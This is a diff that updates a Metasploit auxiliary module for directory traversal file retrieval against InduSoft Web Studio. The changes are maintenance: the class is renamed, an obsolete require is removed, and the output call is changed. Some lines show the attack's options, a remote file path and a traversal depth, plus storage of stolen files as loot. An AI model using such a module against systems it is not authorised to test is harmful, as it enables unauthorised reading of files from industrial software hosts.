@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -39,10 +36,9 @@ class Metasploit4 < Msf::Auxiliary
     [
       OptString.new('RFILE', [true, 'Remote File', '/windows\\win.ini']),
       OptInt.new('DEPTH', [true, 'Traversal depth', 3])
-    ], self.class)
+    ])
 
     register_autofilter_ports([ 80 ])
-    deregister_options('RHOST')
   end
 
   def run_host(ip)
@@ -99,12 +95,11 @@ class Metasploit4 < Msf::Auxiliary
       end
       f = ::File.basename(datastore['RFILE'])
       path = store_loot('indusoft.webstudio.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
-      print_status("#{rhost}:#{rport} - #{datastore['RFILE']} saved in #{path}")
+      print_good("#{rhost}:#{rport} - #{datastore['RFILE']} saved in #{path}")
       return
     end
 
     print_error("#{rhost}:#{rport} - Failed to retrieve file")
   end
-
 end
 
